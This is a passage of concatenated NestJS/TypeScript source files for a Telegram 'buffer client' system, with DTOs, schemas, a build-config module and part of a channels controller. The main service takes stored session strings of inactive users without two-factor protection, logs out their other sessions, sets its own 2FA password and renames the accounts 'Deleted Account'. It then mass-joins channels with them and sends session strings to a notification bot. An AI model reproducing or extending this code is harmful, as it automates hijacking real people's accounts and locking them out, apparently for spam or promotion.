this.update(existingUser.mobile, createOrUpdateUserDto as UpdateBufferClientDto);\n        } else {\n            console.log(\"creating\")\n            // Ensure status is set to 'active' by default if not provided\n            return this.create({ ...createOrUpdateUserDto, status: (createOrUpdateUserDto as any).status || 'active' } as CreateBufferClientDto);\n        }\n    }\n\n    async remove(mobile: string): Promise<void> {\n        try {\n            const bufferClient = await this.findOne(mobile, false);\n            if (!bufferClient) {\n                throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\n            }\n            this.logger.log(`Removing BufferClient with mobile: ${mobile}`);\n            await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}\\nsession: ${bufferClient.session}`)}`);\n            await this.bufferClientModel.deleteOne({ mobile }).exec();\n        } catch (error) {\n            const errorDetails = parseError(error);\n            this.logger.error(`Error removing BufferClient with mobile ${mobile}: ${errorDetails.message}`);\n            throw new HttpException(errorDetails.message, errorDetails.status);\n        }\n        this.logger.log(`BufferClient with mobile ${mobile} removed successfully`);\n    }\n    async search(filter: any): Promise<BufferClient[]> {\n        // Allow filtering by status\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        if (filter.status) {\n            filter.status = filter.status;\n        }\n        return this.bufferClientModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<BufferClient[]> {\n        try {\n\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.bufferClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    removeFromBufferMap(key: string) {\n        this.joinChannelMap.delete(key);\n    }\n\n    clearBufferMap() {\n        console.log(\"BufferMap cleared\");\n        this.joinChannelMap.clear();\n        this.clearJoinChannelInterval();\n    }\n\n\n    async updateStatus(mobile: string, status: string, message?: string): Promise<BufferClient> {\n        const updateData: any = { status };\n        if (message) {\n            updateData.message = message;\n        }\n\n        return this.update(mobile, updateData);\n    }\n\n    async markAsInactive(mobile: string, reason: string): Promise<BufferClient> {\n        return this.updateStatus(mobile, 'inactive', reason);\n    }\n\n    async updateInfo() {\n        const clients = await this.bufferClientModel.find({\n            status: 'active'\n        }).sort({ channels: 1 })\n\n        for (const client of clients) {\n            const mobile = client.mobile;\n            try {\n                this.logger.debug(`Updating info for client: ${mobile}`);\n                const telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n                const channels = await telegramClient.channelInfo(true);\n                this.logger.debug(`${mobile}: Found ${channels.ids.length} existing channels`);\n                await this.update(mobile, { channels: channels.ids.length });\n                await connectionManager.unregisterClient(mobile);\n                await sleep(2000);\n            } catch (error) {\n                const errorDetails = parseError(error);\n                await this.markAsInactive(mobile, `${errorDetails.message}`);\n                this.logger.error(`Error updating info for client ${client.mobile}:`, errorDetails);\n            }\n        }\n    }\n\n    async joinchannelForBufferClients(skipExisting: boolean = true): Promise<string> {\n        if (this.telegramService.getActiveClientSetup()) {\n            this.logger.warn('Ignored active check buffer channels as active client setup exists');\n            return 'Active client setup exists, skipping buffer promotion';\n        }\n\n        this.logger.log('Starting join channel process for buffer clients');\n\n        this.joinChannelMap.clear();\n        this.leaveChannelMap.clear();\n        this.clearJoinChannelInterval();\n        this.clearLeaveChannelInterval();\n        await sleep(2000);\n\n        const existingKeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());\n        const clients = await this.bufferClientModel.find({\n            channels: { $lt: 350 },\n            mobile: { $nin: existingKeys }\n        }).sort({ channels: 1 }).limit(8);\n\n        this.logger.debug(`Found ${clients.length} buffer clients to process`);\n\n        const joinSet = new Set<string>();\n        const leaveSet = new Set<string>();\n\n        let successCount = 0;\n        let failCount = 0;\n\n        for (const document of clients) {\n            const mobile = document.mobile;\n            this.logger.debug(`Processing buffer client: ${mobile}`);\n\n            try {\n                const client = await connectionManager.getClient(mobile, {\n                    autoDisconnect: false,\n                    handler: false\n                });\n\n                const channels = await client.channelInfo(true);\n                this.logger.debug(`Client ${mobile} has ${channels.ids.length} existing channels`);\n                await this.update(mobile, { channels: channels.ids.length });\n\n                if (channels.canSendFalseCount < 10) {\n                    const excludedIds = channels.ids;\n                    const result = channels.ids.length < 220\n                        ? await this.channelsService.getActiveChannels(150, 0, excludedIds)\n                        : await this.activeChannelsService.getActiveChannels(150, 0, excludedIds);\n\n                    if (!this.joinChannelMap.has(mobile)) {\n                        this.joinChannelMap.set(mobile, result);\n                        joinSet.add(mobile);\n                        this.logger.debug(`Added ${result.length} channels to join queue for ${mobile}`);\n                    } else {\n                        this.logger.debug(`${mobile}: Already present in join map, skipping`);\n                    }\n\n                } else {\n                    if (!this.leaveChannelMap.has(mobile)) {\n                        this.leaveChannelMap.set(mobile, channels.canSendFalseChats);\n                        leaveSet.add(mobile);\n                        this.logger.warn(`Client ${mobile} has ${channels.canSendFalseChats.length} restricted channels, added to leave queue`);\n                    } else {\n                        this.logger.debug(`${mobile}: Already present in leave map, skipping`);\n                    }\n                }\n\n                successCount++;\n\n            } catch (error) {\n                failCount++;\n\n                const errorDetails = parseError(error);\n                const errorMsg = errorDetails?.message || error?.errorMessage || 'Unknown error';\n\n                const isFatal = [\n                    \"SESSION_REVOKED\",\n                    \"AUTH_KEY_UNREGISTERED\",\n                    \"USER_DEACTIVATED\",\n                    \"USER_DEACTIVATED_BAN\"\n                ].includes(errorMsg);\n\n                if (isFatal) {\n                    this.logger.error(`Session invalid for ${mobile} due to ${errorMsg}, removing client`);\n                    try {\n                        await this.remove(mobile);\n                    } catch (removeErr) {\n                        this.logger.error(`Failed to remove client ${mobile}:`, removeErr);\n                    }\n                } else {\n                    this.logger.warn(`Transient error for ${mobile}: ${errorMsg}`);\n                }\n            } finally {\n                connectionManager.unregisterClient(mobile);\n            }\n            await sleep(2000);\n        }\n\n        if (joinSet.size > 0) {\n            this.logger.debug(`Starting join queue for ${joinSet.size} buffer clients`);\n            this.joinChannelQueue();\n        }\n\n        if (leaveSet.size > 0) {\n            this.logger.debug(`Starting leave queue for ${leaveSet.size} buffer clients`);\n            this.leaveChannelQueue();\n        }\n\n        this.logger.log(`Join process complete — Success: ${successCount}, Fail: ${failCount}`);\n        return `Buffer Join queued for: ${joinSet.size}, Leave queued for: ${leaveSet.size}`;\n    }\n\n    async joinChannelQueue() {\n        this.logger.debug('Attempting to start join channel queue');\n        if (this.isJoinChannelProcessing || this.joinChannelIntervalId) {\n            this.logger.warn('Join channel process is already running');\n            return;\n        }\n\n        const existingKeys = Array.from(this.joinChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to join, not starting queue');\n            return;\n        }\n\n        this.isJoinChannelProcessing = true;\n        this.joinChannelIntervalId = setInterval(async () => {\n            let processTimeout: NodeJS.Timeout;\n            try {\n                const keys = Array.from(this.joinChannelMap.keys());\n                if (keys.length === 0) {\n                    this.clearJoinChannelInterval();\n                    return;\n                }\n\n                // Add timeout to prevent infinite processing\n                processTimeout = setTimeout(() => {\n                    this.logger.error('Join channel interval processing timeout');\n                    this.clearJoinChannelInterval();\n                }, this.JOIN_CHANNEL_INTERVAL - 1000);\n\n                this.logger.debug(`Processing join channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.joinChannelIntervalId}`);\n\n                for (const mobile of keys) {\n                    let currentChannel: Channel | null = null;\n                    try {\n                        const channels = this.joinChannelMap.get(mobile);\n                        if (!channels || channels.length === 0) {\n                            this.logger.debug(`No more channels to join for ${mobile}, removing from queue`);\n                            this.removeFromBufferMap(mobile);\n                            continue;\n                        }\n\n                        currentChannel = channels.shift();\n                        this.logger.debug(`${mobile} has ${channels.length} pending channels to join`);\n                        this.joinChannelMap.set(mobile, channels);\n\n                        const client = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n                        this.logger.debug(`${mobile} attempting to join channel: @${currentChannel.username}`);\n                        await this.telegramService.tryJoiningChannel(mobile, currentChannel);\n                        await connectionManager.unregisterClient(mobile);\n                    } catch (error: any) {\n                        const errorDetails = parseError(error, `${mobile} ${currentChannel ? `@${currentChannel.username}` : ''} Outer Err ERR: `, false);\n                        this.logger.error(`Error joining channel for ${mobile}: ${error.message}`);\n\n                        if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {\n                            this.logger.warn(`${mobile} has FloodWaitError or joined too many channels, removing from queue`);\n                            this.removeFromBufferMap(mobile);\n                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);\n                            await this.update(mobile, { channels: channelsInfo.ids.length });\n                        }\n\n                        if (error.errorMessage === \"SESSION_REVOKED\" ||\n                            error.errorMessage === \"AUTH_KEY_UNREGISTERED\" ||\n                            error.errorMessage === \"USER_DEACTIVATED\" ||\n                            error.errorMessage === \"USER_DEACTIVATED_BAN\" ||\n                            error.errorMessage === \"FROZEN_METHOD_INVALID\") {\n                            this.logger.error(`Session invalid for ${mobile}, removing client`);\n                            this.removeFromBufferMap(mobile);\n                            await this.remove(mobile);\n                        }\n\n                        try {\n                            await connectionManager.unregisterClient(mobile);\n                        } catch (unregisterError) {\n                            this.logger.error(`Error unregistering client ${mobile}: ${unregisterError.message}`);\n                        }\n                    }\n                }\n            } catch (error) {\n                this.logger.error('Error in join channel interval', error);\n                this.clearJoinChannelInterval();\n            } finally {\n                if (processTimeout) {\n                    clearTimeout(processTimeout);\n                }\n            }\n        }, this.JOIN_CHANNEL_INTERVAL);\n\n        this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`);\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            this.logger.debug(`Clearing join channel interval: ${this.joinChannelIntervalId}`);\n            clearInterval(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n            this.isJoinChannelProcessing = false;\n\n            // Only schedule next run if there are items in the map\n            if (this.joinChannelMap.size > 0) {\n                setTimeout(() => {\n                    this.logger.debug('Triggering next join channel process');\n                    this.joinchannelForBufferClients(false);\n                }, 30000);\n            }\n        }\n    }\n\n    removeFromLeaveMap(key: string) {\n        this.leaveChannelMap.delete(key);\n        if (this.leaveChannelMap.size === 0) {\n            this.clearLeaveChannelInterval();\n        }\n    }\n\n    clearLeaveMap() {\n        console.log(\"LeaveMap cleared\");\n        this.leaveChannelMap.clear();\n        this.clearLeaveChannelInterval();\n    }\n\n    async leaveChannelQueue() {\n        if (this.isLeaveChannelProcessing || this.leaveChannelIntervalId) {\n            this.logger.warn('Leave channel process is already running');\n            return;\n        }\n\n        const existingKeys = Array.from(this.leaveChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to leave, not starting queue');\n            return;\n        }\n\n        this.isLeaveChannelProcessing = true;\n        this.leaveChannelIntervalId = setInterval(async () => {\n            let processTimeout: NodeJS.Timeout;\n            try {\n                const keys = Array.from(this.leaveChannelMap.keys());\n                if (keys.length === 0) {\n                    this.logger.debug('Leave map is empty, clearing interval');\n                    this.clearLeaveChannelInterval();\n                    return;\n                }\n\n                // Add timeout to prevent infinite processing\n                processTimeout = setTimeout(() => {\n                    this.logger.error('Leave channel interval processing timeout');\n                    this.clearLeaveChannelInterval();\n                }, this.LEAVE_CHANNEL_INTERVAL - 1000);\n\n                this.logger.debug(`Processing leave channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.leaveChannelIntervalId}`);\n\n                for (const mobile of keys) {\n                    try {\n                        const channels = this.leaveChannelMap.get(mobile);\n                        if (!channels || channels.length === 0) {\n                            this.logger.debug(`No more channels to leave for ${mobile}, removing from queue`);\n                            this.removeFromLeaveMap(mobile);\n                            continue;\n                        }\n\n                        const channelsToProcess = channels.splice(0, this.LEAVE_CHANNEL_BATCH_SIZE);\n                        this.logger.debug(`${mobile} has ${channels.length} pending channels to leave`);\n\n                        // Only update map if there are remaining channels\n                        if (channels.length > 0) {\n                            this.leaveChannelMap.set(mobile, channels);\n                        } else {\n                            this.removeFromLeaveMap(mobile);\n                        }\n\n                        const client = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n                        this.logger.debug(`${mobile} attempting to leave ${channelsToProcess.length} channels`);\n                        await client.leaveChannels(channelsToProcess);\n                        this.logger.debug(`${mobile} left channels successfully`);\n                        await connectionManager.unregisterClient(mobile);\n                    } catch (error: any) {\n                        const errorDetails = parseError(error, `${mobile} Leave Channel ERR: `, false);\n                        if (\n                            errorDetails.message === \"SESSION_REVOKED\" ||\n                            errorDetails.message === \"AUTH_KEY_UNREGISTERED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED_BAN\"\n                        ) {\n                            this.logger.error(`Session invalid for ${mobile}, removing client`);\n                            await this.remove(mobile);\n                            this.removeFromLeaveMap(mobile);\n                        }\n\n                        try {\n                            await connectionManager.unregisterClient(mobile);\n                        } catch (unregisterError) {\n                            this.logger.error(`Error unregistering client ${mobile}: ${unregisterError.message}`);\n                        }\n                    }\n                }\n            } catch (error) {\n                this.logger.error('Error in leave channel interval', error);\n                this.clearLeaveChannelInterval();\n            } finally {\n                if (processTimeout) {\n                    clearTimeout(processTimeout);\n                }\n            }\n        }, this.LEAVE_CHANNEL_INTERVAL);\n\n        this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`);\n    }\n\n    clearLeaveChannelInterval() {\n        if (this.leaveChannelIntervalId) {\n            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);\n            clearInterval(this.leaveChannelIntervalId);\n            this.leaveChannelIntervalId = null;\n        }\n        this.isLeaveChannelProcessing = false;\n        this.logger.debug('Leave channel interval cleared and processing flag reset');\n    }\n\n    async setAsBufferClient(\n        mobile: string,\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n    ) {\n        const user = (await this.usersService.search({ mobile }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        const isExist = await this.findOne(mobile, false)\n        if (isExist) {\n            throw new ConflictException('BufferClient already exist');\n        }\n        const clients = await this.clientService.findAll();\n        const clientMobiles = clients.map(client => client?.mobile);\n\n        // Get promote mobiles using the new schema\n        const allPromoteMobiles = [];\n        for (const client of clients) {\n            const clientPromoteMobiles = await this.clientService.getPromoteMobiles(client.clientId);\n            allPromoteMobiles.push(...clientPromoteMobiles);\n        }\n\n        if (!allPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {\n            try {\n                const telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false })\n                await telegramClient.set2fa();\n                await sleep(15000)\n                await telegramClient.updateUsername('');\n                await sleep(3000)\n                await telegramClient.updatePrivacyforDeletedAccount();\n                await sleep(3000)\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                await sleep(3000)\n                await telegramClient.deleteProfilePhotos();\n                const channels = await this.telegramService.getChannelInfo(mobile, true)\n                const bufferClient = {\n                    tgId: user.tgId,\n                    session: user.session,\n                    mobile: user.mobile,\n                    availableDate,\n                    channels: channels.ids.length,\n                    status: 'active',\n                };\n                await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();\n            } catch (error) {\n                const errorDetails = parseError(error)\n                throw new HttpException(errorDetails.message, errorDetails.status)\n            }\n            await connectionManager.unregisterClient(mobile)\n            return \"Client set as buffer successfully\";\n        } else {\n            throw new BadRequestException(\"Number is a Active Client\")\n        }\n    }\n\n    async checkBufferClients() {\n        if (this.telegramService.getActiveClientSetup()) {\n            this.logger.warn(\"Ignored active check buffer channels as active client setup exists\");\n            return;\n        }\n        await sleep(2000);\n        const bufferclients = await this.findAll('active');\n        const badIds: string[] = [];\n        let goodIds: string[] = [];\n\n        if (bufferclients.length < 80) {\n            for (let i = 0; i < 80 - bufferclients.length; i++) {\n                badIds.push(i.toString());\n            }\n        }\n\n        const clients = await this.clientService.findAll();\n        const promoteclients = await this.promoteClientService.findAll();\n\n        // Get all client mobiles including promote mobiles using new schema\n        const clientMainMobiles = clients.map(c => c.mobile);\n        const allPromoteMobiles = [];\n        for (const client of clients) {\n            const clientPromoteMobiles = await this.clientService.getPromoteMobiles(client.clientId);\n            allPromoteMobiles.push(...clientPromoteMobiles);\n        }\n        const clientIds = [...clientMainMobiles, ...allPromoteMobiles].filter(Boolean);\n\n        const promoteclientIds = promoteclients.map(c => c.mobile);\n        const today = new Date().toISOString().split('T')[0];\n\n        const toProcess = bufferclients.filter(doc =>\n            !clientIds.includes(doc.mobile) &&\n            !promoteclientIds.includes(doc.mobile)\n        );\n\n        const parallelLimit = 4;\n        for (let i = 0; i < toProcess.length; i += parallelLimit) {\n            const chunk = toProcess.slice(i, i + parallelLimit);\n            const results = await Promise.allSettled(chunk.map(doc => this.processBufferClient(doc, badIds, goodIds)));\n            await sleep(2000); // delay between batches\n        }\n\n        // Mark already active clients as good\n        for (const doc of bufferclients) {\n            if (clientIds.includes(doc.mobile) || promoteclientIds.includes(doc.mobile)) {\n                this.logger.warn(\"Number is an Active Client\");\n                goodIds.push(doc.mobile);\n                await this.remove(doc.mobile);\n            }\n        }\n\n        goodIds = [...new Set([...goodIds, ...clientIds, ...promoteclientIds])];\n        this.logger.debug(`GoodIds: ${goodIds.length}, BadIds: ${badIds.length}`);\n        await this.addNewUserstoBufferClients(badIds, goodIds);\n    }\n\n    private async processBufferClient(doc: any, badIds: string[], goodIds: string[]) {\n        try {\n            const cli = await connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });\n\n            try {\n                const me = await cli.getMe();\n\n                if (me.username) {\n                    await this.telegramService.updateUsername(doc.mobile, '');\n                    await sleep(2000);\n                }\n\n                if (me.firstName !== \"Deleted Account\") {\n                    await this.telegramService.updateNameandBio(doc.mobile, 'Deleted Account', '');\n                    await sleep(2000);\n                }\n\n                await this.telegramService.deleteProfilePhotos(doc.mobile);\n                const hasPassword = await cli.hasPassword();\n\n                if (!hasPassword) {\n                    this.logger.warn(\"Client does not have password\");\n                    badIds.push(doc.mobile);\n                } else {\n                    this.logger.debug(doc.mobile + \" : ALL Good\");\n                    goodIds.push(doc.mobile);\n                }\n            } catch (innerError: any) {\n                this.logger.error(`Error processing client ${doc.mobile}: ${innerError.message}`);\n                badIds.push(doc.mobile);\n                await this.remove(doc.mobile);\n            } finally {\n                await connectionManager.unregisterClient(doc.mobile);\n            }\n\n            await sleep(2000); // slight delay between individual client ops\n\n        } catch (error: any) {\n            this.logger.error(`Error with client ${doc.mobile}: ${error.message}`);\n            parseError(error);\n            badIds.push(doc.mobile);\n            await this.remove(doc.mobile);\n            try {\n                await connectionManager.unregisterClient(doc.mobile);\n            } catch (unregisterError) {\n                this.logger.error(`Error unregistering client ${doc.mobile}: ${unregisterError.message}`);\n            }\n        }\n    }\n\n\n    async addNewUserstoBufferClients(badIds: string[], goodIds: string[]) {\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\n        const documents = await this.usersService.executeQuery(\n            {\n                mobile: { $nin: goodIds },\n                expired: false,\n                twoFA: false,\n                lastActive: { $lt: sixMonthsAgo },\n                totalChats: { $gt: 150 }\n            },\n            { tgId: 1 },\n            badIds.length + 3\n        );\n\n        this.logger.debug(`New buffer documents to be added: ${documents.length}`);\n\n        while (badIds.length > 0 && documents.length > 0) {\n            const document = documents.shift();\n            if (!document || !document.mobile || !document.tgId || !document.session) {\n                this.logger.warn('Invalid document found, skipping');\n                continue;\n            }\n\n            try {\n                const client = await connectionManager.getClient(document.mobile, { autoDisconnect: false });\n                try {\n                    const hasPassword = await client.hasPassword();\n                    this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);\n\n                    if (!hasPassword) {\n                        await client.removeOtherAuths();\n                        await client.set2fa();\n                        this.logger.debug(\"Waiting for setting 2FA\");\n                        await sleep(30000);\n\n                        await client.updateUsername('');\n                        await sleep(3000);\n\n                        await client.updatePrivacyforDeletedAccount();\n                        await sleep(3000);\n\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                        await sleep(3000);\n\n                        await client.deleteProfilePhotos();\n                        await sleep(2000);\n\n                        await this.telegramService.removeOtherAuths(document.mobile);\n                        const channels = await client.channelInfo(true);\n\n                        this.logger.debug(\"Creating buffer client document\");\n                        const bufferClient: CreateBufferClientDto = {\n                            tgId: document.tgId,\n                            session: document.session,\n                            mobile: document.mobile,\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\n                            channels: channels.ids.length,\n                            status: 'active',\n                        };\n                        await this.create(bufferClient);\n                        await this.usersService.update(document.tgId, { twoFA: true });\n                        this.logger.debug(\"=============Created BufferClient=============\");\n                        badIds.pop();\n                    } else {\n                        this.logger.debug(`Failed to Update as BufferClient as ${document.mobile} already has Password`);\n                        await this.usersService.update(document.tgId, { twoFA: true });\n                    }\n                } catch (error: any) {\n                    this.logger.error(`Error processing client ${document.mobile}: ${error.message}`);\n                    parseError(error);\n                } finally {\n                    try {\n                        await connectionManager.unregisterClient(document.mobile);\n                    } catch (unregisterError: any) {\n                        this.logger.error(`Error unregistering client ${document.mobile}: ${unregisterError.message}`);\n                    }\n                }\n            } catch (error: any) {\n                this.logger.error(`Error creating client connection for ${document.mobile}: ${error.message}`);\n                parseError(error);\n            }\n        }\n\n        // Schedule next join channel process\n        setTimeout(() => {\n            this.logger.log('Starting next join channel process');\n            this.joinchannelForBufferClients();\n        }, 2 * 60 * 1000);\n    }\n}\n","import { ApiProperty } from '@nestjs/swagger';\nimport {  IsNumber, IsString } from 'class-validator';\n\nexport class CreateBufferClientDto {\n  @ApiProperty({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsString()\n  readonly tgId: string;\n\n  @ApiProperty({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsString()\n  readonly mobile: string;\n\n  @ApiProperty({\n    description: 'Date of the session',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly availableDate: string;\n\n  @ApiProperty({\n    description: 'Session identifier',\n    example: 'session123',\n  })\n  @IsString()\n  readonly session: string;\n\n  @ApiProperty({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels: number;\n\n  @ApiProperty({\n    description: 'Status of the buffer client',\n    example: 'active',\n    enum: ['active', 'inactive'],\n    default: 'active',\n    required: false,\n  })\n  @IsString()\n  readonly status?: 'active' | 'inactive';\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\n\nexport class SearchBufferClientDto {\n  @ApiPropertyOptional({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsOptional()\n  @IsString()\n  readonly tgId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsOptional()\n  @IsString()\n  readonly mobile?: string;\n\n  @ApiPropertyOptional({\n    description: 'availableDate of the bufferClient',\n    example: '2023-06-22',\n  })\n  @IsOptional()\n  @IsString()\n  readonly availableDate?: string;\n\n  @ApiPropertyOptional({\n    description: 'Session identifier',\n    example: 'session123',\n  })\n  @IsOptional()\n  @IsString()\n  readonly session?: string;\n\n  @ApiPropertyOptional({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels?: number;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateBufferClientDto } from './create-buffer-client.dto';\n\nexport class UpdateBufferClientDto extends PartialType(CreateBufferClientDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type BufferClientDocument = BufferClient & Document;\n@Schema({ collection: 'bufferClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class BufferClient {\n  @Prop({ required: true})\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n  \n  @Prop({ required: true })\n  session: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n  \n  @Prop({\n    required: true,\n    enum: ['active', 'inactive'],\n    default: 'active',\n    type: String,\n    description: 'Status of the buffer client',\n  })\n  status: 'active' | 'inactive';\n}\n\nexport const BufferClientSchema = SchemaFactory.createForClass(BufferClient);\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { BuildService } from './build.service';\n\n@ApiTags('Build')\n@Controller('builds')\nexport class BuildController {\n  constructor(private readonly buildService: BuildService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get build data' })\n  async findOne(): Promise<any>{\n    return this.buildService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update build' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.buildService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { BuildService } from './build.service';\nimport { BuildController } from './build.controller';\nimport { BuildSchema } from './builds.schema';\nimport { NpointModule } from '../n-point/npoint.module';\nimport { InitModule } from '../ConfigurationInit/init.module';\n\n@Global()\n@Module({\n  imports: [\n    InitModule,\n    BuildModule,\n    MongooseModule.forFeature([{ name: 'buildModule', collection: 'builds', schema: BuildSchema }]),\n    NpointModule,\n  ],\n  providers: [BuildService],\n  controllers: [BuildController],\n  exports: [BuildModule],\n})\nexport class BuildModule { }","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Build } from './builds.schema';\nimport { NpointService } from '../n-point/npoint.service';\n\n@Injectable()\nexport class BuildService {\n    constructor(@InjectModel('buildModule') private buildModel: Model<Build>,\n        private npointSerive: NpointService) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = await this.buildModel.findOne({}).exec();\n        if (!user) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.buildModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        try {\n            await this.npointSerive.updateDocument(\"3375d15db1eece560188\", updatedUser)\n            console.log(\"Updated document successfully in npoint\")\n        } catch (error) {\n            console.log(error)\n        }\n        if (!updatedUser) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type BuildDocument = Build & Document;\n\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class Build {}\n\nexport const BuildSchema = SchemaFactory.createForClass(Build);\nBuildSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","// src/channels/channels.controller.ts\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\nimport { ChannelsService } from './channels.service';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\nimport { SearchChannelDto } from './dto/search-channel.dto';\nimport { CreateChannelDto } from './dto/create-channel.dto';\nimport { UpdateChannelDto } from './dto/update-channel.dto';\nimport { Channel } from './schemas/channel.schema';\n\n@ApiTags('Channels')\n@Controller('channels')\nexport class ChannelsController {\n  constructor(private readonly channelsService: ChannelsService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new  channel' })\n  async create(@Body() createChannelDto: CreateChannelDto) {\n    return this.channelsService.create(createChannelDto);\n  }\n  @Post('createMultiple')\n  @ApiOperation({ summary: 'Create multiple channels' })\n  @ApiBody({ type: [CreateChannelDto] })\n  async createMultiple(@Body() createChannelDtos: CreateChannelDto[]): Promise<string> {\n    return this.channelsService.createMultiple(createChannelDtos);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search channels by filters' })\n  @ApiQuery({ name: 'channelId', required: false, type: String })\n  @ApiQuery({ name: 'broadcast', required: false, type: Boolean })\n  @ApiQuery({ name: 'canSendMsgs', required: false, type: Boolean })\n  @ApiQuery({ name: 'participantsCount', required: false, type: Number })\n  @ApiQuery({ name: 'restricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'sendMessages', required: false, type: Boolean })\n  @ApiQuery({ name: 'title', required: false, type: String })\n  @ApiQuery({ name: 'username', required: false, type: String })\n  search(@Query() query: SearchChannelDto): Promise<Channel[]> {\n    console.log(query);\n    return this.channelsService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all  channels' })\n  async findAll() {\n    return this.channelsService.findAll();\n  }\n\n  @Get(':channelId')\n  @ApiOperation({ summary: 'Get an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'Return the  channel', type: Channel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async findOne(@Param('channelId') channelId: string) {\n    return this.channelsService.findOne(channelId);\n  }\n\n  @Patch(':channelId')\n  @ApiOperation({ summary: 'Update an  channel by channelId' })\n  